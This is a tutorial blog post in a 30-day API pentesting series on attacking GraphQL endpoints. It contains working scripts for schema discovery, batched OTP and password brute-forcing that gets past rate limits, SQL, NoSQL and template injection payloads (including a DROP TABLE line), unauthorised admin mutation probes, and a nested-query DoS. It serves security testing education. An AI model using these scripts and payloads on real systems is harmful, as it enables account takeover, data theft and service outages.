# GraphQL Pentesting: Introspection, Batching Attacks & Injections

> **Series:** 30-Day API Pentesting | **Day 19** | Week 3: Tools & Techniques  
> **Difficulty:** Beginner → Intermediate  
> **Topic:** GraphQL Attack Techniques: Introspection to SQLi

---

## What Makes GraphQL Different — and More Dangerous?

Traditional REST APIs have many endpoints:
```
GET  /api/users
GET  /api/users/1
POST /api/orders
GET  /api/products
```

GraphQL has **ONE endpoint** that handles everything:
```
POST /graphql
```

The client tells the server exactly what data it wants by writing a **query** in the request body. This flexibility is powerful for developers — and a goldmine for attackers.

Why is it more dangerous?

1. **Self-documenting** — GraphQL can tell you its own entire schema via introspection
2. **Flexible queries** — client controls depth, fields, and relationships
3. **Less WAF coverage** — security tools miss GraphQL payloads in POST bodies
4. **No versioning** — single schema means one vulnerability affects everything
5. **Batching** — multiple operations in one request bypasses rate limiting

---

## Part 1: Finding the GraphQL Endpoint

GraphQL always exposes ONE endpoint. Your first job is to find it.

```bash
# Common GraphQL endpoint paths — try all of them
PATHS=(
    "/graphql"
    "/api/graphql"
    "/v1/graphql"
    "/v2/graphql"
    "/query"
    "/gql"
    "/graphiql"        # development IDE — huge finding in production!
    "/playground"      # Apollo playground
    "/altair"
    "/.well-known/graphql"
)

TARGET="https://target.com"
for path in "${PATHS[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$TARGET$path" \
        -H "Content-Type: application/json" \
        -d '{"query":"{"}')
    [ "$CODE" != "404" ] && echo "FOUND: $path [$CODE]"
done
```

### The Confirmation Test

Send a deliberately broken query. GraphQL's error message is distinct and confirms the endpoint:

```bash
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{"}'

# GraphQL response (endpoint confirmed):
# {"errors":[{"message":"Syntax Error: Expected Name, found '}'. "}]}

# NOT GraphQL (404 or HTML error page):
# <html><title>404 Not Found</title>...

# Also try GET request (some GraphQL endpoints support it):
curl "https://target.com/graphql?query={__typename}"
# Response: {"data":{"__typename":"Query"}}  ← confirmed!
```

### Finding GraphQL in JavaScript

```bash
# GraphQL endpoints are often hardcoded in frontend JavaScript
curl -s https://target.com/app.js | grep -oE '"(/[^"]*graphql[^"]*)"' | sort -u
curl -s https://target.com/app.js | grep -oE '"(/[^"]*gql[^"]*)"' | sort -u

# Look for Apollo client config:
grep -r "apolloClient\|ApolloClient\|GraphQLClient" *.js | grep -oE '"https?://[^"]*"'
```

---

## Part 2: Introspection — The Hacker's Gift

Introspection is GraphQL's built-in feature that lets clients **ask the server for its entire schema**. In development this is useful. In production, it's handing attackers a map of everything.

### Running Introspection

```bash
# Full introspection query — dumps EVERYTHING
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{
        "query": "{
            __schema {
                queryType { name }
                mutationType { name }
                types {
                    name
                    kind
                    fields {
                        name
                        type { name kind ofType { name } }
                        args { name type { name } }
                    }
                }
            }
        }"
    }'
```

### What to Look For in the Schema

After getting the schema, scan it for sensitive-sounding types and fields:

```python
import json, requests

resp = requests.post("https://target.com/graphql",
    json={"query": "{__schema{types{name fields{name}}}}"},
    headers={"Authorization": "Bearer YOUR_TOKEN"}
)
schema = resp.json()

# Danger words to grep for:
DANGEROUS = ["admin", "delete", "remove", "ban", "role", "permission",
             "password", "secret", "key", "token", "internal", "debug",
             "export", "import", "execute", "shell", "backup", "config"]

for type_info in schema["data"]["__schema"]["types"]:
    typename = type_info.get("name", "")
    for field in (type_info.get("fields") or []):
        fname = field.get("name", "")
        for danger in DANGEROUS:
            if danger.lower() in fname.lower() or danger.lower() in typename.lower():
                print(f"INTERESTING: {typename}.{fname}")
                break
```

### Using InQL Extension in Burp

InQL (available in BApp Store) automatically:
1. Runs full introspection on any GraphQL endpoint
2. Generates every possible query and mutation
3. Creates a Burp Repeater tab for each one

```
Burp → Extensions → BApp Store → InQL → Install
Then: Open a GraphQL request in Burp → right-click → InQL Scanner
```

---

## Part 3: Introspection Disabled? Use Clairvoyance

Some production servers disable introspection. You can still discover the schema by **guessing field names** and watching error messages.

### How Clairvoyance Works

```
You send: {users{email}}   → Server: "Unknown field 'email' on type 'User'"
You send: {users{emaill}}  → Server: "Unknown field 'emaill'. Did you mean 'email'?"
                                                                  ↑ GraphQL is helping you!
```

The difference in error messages tells you which fields exist.

### Using Clairvoyance

```bash
# Install
pip3 install clairvoyance

# Run against target
python3 -m clairvoyance \
    https://target.com/graphql \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -o schema.json \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# View results
cat schema.json | python3 -m json.tool | grep -i "name\|field"
```

### Manual Field Guessing

```bash
# Test if a specific field exists
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"query":"{users{adminRole}}"}'

# If "adminRole" doesn't exist: "Cannot query field 'adminRole' on type 'User'"
# If it exists but wrong type: "Field 'adminRole' of type 'Boolean!'"
# If it exists: returns actual data!

# Common fields to probe:
FIELDS=("role" "isAdmin" "admin" "superuser" "password" "apiKey" "secret"
        "internalId" "creditCard" "ssn" "bankAccount" "verified" "staff")

for field in "${FIELDS[@]}"; do
    echo -n "Testing '$field': "
    curl -s -X POST https://target.com/graphql \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"{users{$field}}\"}" | grep -o "message.*" | head -1
done
```

---

## Part 4: Batching Attack — Bypass Rate Limiting

This is one of the most impactful GraphQL-specific attacks. Rate limiting is typically enforced per HTTP request. But GraphQL allows multiple operations in a single request.

### Understanding the Math

```
Scenario: 6-digit OTP brute force
- 1,000,000 possible combinations
- Rate limit: 10 OTP attempts per minute → 100,000 minutes → impossible

With GraphQL batching:
- 1000 alias queries per request
- Rate limit applies to the request, not the queries
- 1,000,000 / 1000 = 1000 requests
- At 10 requests per minute → 100 minutes → FEASIBLE!
```

### Array Batching

Send an array of operation objects in one POST:

```bash
# Python script for batch OTP brute force
import requests, json

TARGET = "https://target.com/graphql"
HEADERS = {
    "Content-Type": "application/json",
    "Authorization": "Bearer USER_TOKEN"
}

# Build 1000 OTP guesses in one request
batch = [
    {"query": f'mutation {{ verifyOTP(code: "{str(i).zfill(6)}") {{ success token }} }}'}
    for i in range(0, 1000)
]

resp = requests.post(TARGET, json=batch, headers=HEADERS)
results = resp.json()

for i, result in enumerate(results):
    data = result.get("data", {}).get("verifyOTP", {})
    if data.get("success"):
        otp = str(i).zfill(6)
        token = data.get("token")
        print(f"OTP FOUND: {otp}")
        print(f"Token: {token}")
        break
```

### Alias Batching

Pack multiple operations into ONE query using aliases:

```graphql
# Instead of 1 login attempt, try 5 simultaneously
{
  a1: login(email: "admin@target.com", password: "pass1") { token }
  a2: login(email: "admin@target.com", password: "pass2") { token }
  a3: login(email: "admin@target.com", password: "pass3") { token }
  a4: login(email: "admin@target.com", password: "pass4") { token }
  a5: login(email: "admin@target.com", password: "pass5") { token }
}
```

```python
# Build alias-batched mutation for password brute force
import requests

TARGET = "https://target.com/graphql"
PASSWORDS = open("/usr/share/wordlists/rockyou.txt").read().splitlines()[:5000]
CHUNK_SIZE = 100  # 100 aliases per request

for chunk_start in range(0, len(PASSWORDS), CHUNK_SIZE):
    chunk = PASSWORDS[chunk_start:chunk_start+CHUNK_SIZE]
    
    # Build alias query
    aliases = "\n".join([
        f'a{i}: login(email: "admin@target.com", password: "{p}") {{ token success }}'
        for i, p in enumerate(chunk)
    ])
    query = f"{{ {aliases} }}"
    
    resp = requests.post(TARGET, json={"query": query},
                        headers={"Content-Type": "application/json"})
    results = resp.json().get("data", {})
    
    for key, val in results.items():
        if val and val.get("success"):
            idx = int(key[1:])
            print(f"PASSWORD FOUND: {chunk[idx]}")
            break
    
    if resp.status_code == 429:
        print(f"Rate limited at chunk {chunk_start}")
        break
```

---

## Part 5: Injection via GraphQL Arguments

Every argument passed to a GraphQL field flows into a resolver function. If that resolver doesn't properly sanitize input before using it in a database query or template, injection attacks work exactly like in REST APIs.

### SQL Injection

```graphql
# Normal query:
{ users(name: "john") { email role } }

# SQL injection payloads in the argument:
{ users(name: "x' OR 1=1--") { email role password } }
{ users(name: "x' UNION SELECT password FROM admins--") { email } }
{ users(id: "1; DROP TABLE users;--") { email } }

# Time-based blind SQLi:
{ users(name: "x'; WAITFOR DELAY '0:0:5'--") { email } }
# If response takes 5 seconds → blind SQLi confirmed
```

```bash
# Test with curl:
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"query":"{ users(name: \"x'"'"' OR 1=1--\") { email password } }"}'
```

### NoSQL Injection (MongoDB)

```graphql
# Normal:
{ users(filter: {role: "user"}) { email } }

# NoSQL injection — MongoDB operators in JSON:
{ users(filter: {role: {$ne: null}}) { email password } }
{ users(filter: {email: {$regex: ".*"}}) { email password } }
{ users(filter: {age: {$gt: 0}}) { email password } }
```

```bash
# Test NoSQL injection:
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{ users(filter: {\"$where\": \"1==1\"}) { email } }"}'
```

### SSTI (Server-Side Template Injection)

```graphql
# Test {{7*7}} in any string field argument:
{ render(template: "{{7*7}}") { output } }
# If response.output is "49" → SSTI confirmed!

{ generateReport(title: "${7*7}") { content } }
# Spring/FreeMarker SSTI

{ createPage(content: "#{7*7}") { url } }
# Ruby/Thymeleaf
```

---

## Part 6: Mutations Without Authorization

Every mutation in the schema should be tested without an Authorization header, and with a low-privilege token.

### Finding All Mutations

```bash
# List all mutations from introspection
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{
        "query": "{
            __schema {
                mutationType {
                    name
                    fields { name args { name type { name } } }
                }
            }
        }"
    }' | python3 -c "
import json, sys
data = json.load(sys.stdin)
mutations = data['data']['__schema']['mutationType']['fields']
for m in mutations:
    print(f'mutation: {m[\"name\"]}({[a[\"name\"] for a in m[\"args\"]]})')
"
```

### Testing Each Mutation Without Auth

```python
import requests

TARGET = "https://target.com/graphql"
MUTATIONS = [
    'mutation { deleteUser(id: 1) { success } }',
    'mutation { updateUserRole(userId: 1, role: "admin") { id role } }',
    'mutation { banUser(userId: 1) { success } }',
    'mutation { exportDatabase { downloadUrl } }',
    'mutation { createAdminAccount(email: "hack@hack.com", role: "admin") { token } }',
]

for mutation in MUTATIONS:
    # Test WITHOUT authorization
    resp_noauth = requests.post(TARGET, json={"query": mutation},
                                headers={"Content-Type": "application/json"})
    
    # Test WITH regular user token
    resp_user = requests.post(TARGET, json={"query": mutation},
                              headers={"Content-Type": "application/json",
                                       "Authorization": "Bearer USER_TOKEN"})
    
    noauth_code = resp_noauth.status_code
    user_code = resp_user.status_code
    
    if noauth_code == 200 and "errors" not in resp_noauth.text:
        print(f"CRITICAL - No auth needed: {mutation[:60]}")
    elif user_code == 200 and "errors" not in resp_user.text:
        print(f"HIGH - User can call admin mutation: {mutation[:60]}")
    else:
        print(f"Protected: {mutation[:40]}")
```

### Nested Query DoS

```bash
# Send deeply nested query to crash/slow server (no depth limit)
NESTED_QUERY='{"query":"{a{a{a{a{a{a{a{a{a{a{a{a{a{a{b}}}}}}}}}}}}}}}"}'

curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d "$NESTED_QUERY" \
    -w "\nTime: %{time_total}s\nStatus: %{http_code}\n"

# If server times out or returns 500 → no query depth limit = DoS vulnerability
```

---

## Tools Summary

```bash
# 1. graphql-cop — automated security checks
pip install graphql-cop
graphql-cop -t https://target.com/graphql -H "Authorization: Bearer TOKEN"

# 2. InQL — Burp Suite extension
# Burp → Extensions → BApp Store → InQL → Install

# 3. Clairvoyance — blind introspection
pip install clairvoyance
python3 -m clairvoyance https://target.com/graphql -o schema.json

# 4. GraphQL Voyager — visual schema explorer
# Online: https://apis.guru/graphql-voyager/
# Paste introspection JSON → see visual map of all types and relationships

# 5. Altair / GraphQL Playground
# GUI clients for manually crafting and sending queries
```

---

## Checklist

```
☐  Find /graphql endpoint — try /graphql /api/graphql /graphiql /playground
☐  Run introspection — {__schema{types{name fields{name}}}} → full map
☐  Use InQL in Burp — auto-generates all queries/mutations from schema
☐  Test batching bypass — array of 100 login mutations → rate limit bypass?
☐  Inject every argument — SQLi/NoSQLi/SSTI in all query args and variables
☐  Test unauth mutations — deleteUser/updateRole without Authorization header
☐  Send nested DoS query — {a{a{a{a{b}}}}} → does server crash or timeout?
☐  Check field suggestions — typo in field name → "Did you mean X?" → X exists!
☐  Test with graphql-cop — automated checks for common misconfigurations
```

---

*Written by @anand87794*  
*30-Day API Pentesting Series — Day 19 of 30*
